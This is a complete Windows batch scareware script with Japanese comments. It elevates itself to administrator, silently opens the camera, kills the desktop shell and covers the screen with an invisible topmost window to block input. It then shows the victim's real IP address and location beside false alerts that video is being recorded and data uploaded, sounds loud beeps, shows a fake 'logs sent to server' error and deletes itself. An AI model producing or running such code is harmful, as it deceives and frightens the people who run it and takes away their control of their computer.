@echo off
setlocal
cd /d %~dp0

:: 1. 管理者権限への昇格
openfiles >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: 2. 演出：デコイフォルダとカメラのサイレント起動
start explorer.exe "%USERPROFILE%\Desktop"
start /min microsoft.windows.camera:
timeout /t 1 /nobreak >nul

:: 3. システムロック（画面消失と操作不能化）
taskkill /f /im explorer.exe >nul 2>&1
start /min powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Windows.Forms; $f = New-Object Windows.Forms.Form; $f.WindowState = 'Maximized'; $f.Opacity = 0.01; $f.TopMost = $true; $f.FormBorderStyle = 'None'; $f.ShowDialog()"

:: 4. 証拠突きつけ（PowerShellで直接IP取得）
cls
color 0c
echo [!] CRITICAL SECURITY ALERT: UNAUTHORIZED ACCESS DETECTED
echo.
:: ここで直接外部APIからIPを取得して表示
powershell -Command "$ip = (Invoke-RestMethod http://ip-api.com/json/); echo ('[!] TARGET IP  : ' + $ip.query); echo ('[!] LOCATION   : ' + $ip.city + ', ' + $ip.country); echo ('[!] ISP        : ' + $ip.isp)"
echo.
echo [!] RECORDING VIDEO FEED...
echo [!] UPLOADING DATA TO CENTRAL SERVER...

:: 5. 追い込み（高音ビープ）
powershell -Command "for($i=0; $i -lt 10; $i++){ [System.Console]::Beep(4000, 150); }"

:: 6. 復旧
taskkill /f /im powershell.exe >nul 2>&1
taskkill /f /im Microsoft.Camera.exe >nul 2>&1
start explorer.exe

:: 7. 最後のダイアログ（OKで自爆）
powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [Windows.Forms.MessageBox]::Show('不正アクセスを検知したため、ログをサーバへ転送しました。', 'System Error', 'OK', 'Error')"

:: 8. ファイル自爆
(goto) 2>nul & del "%~f0"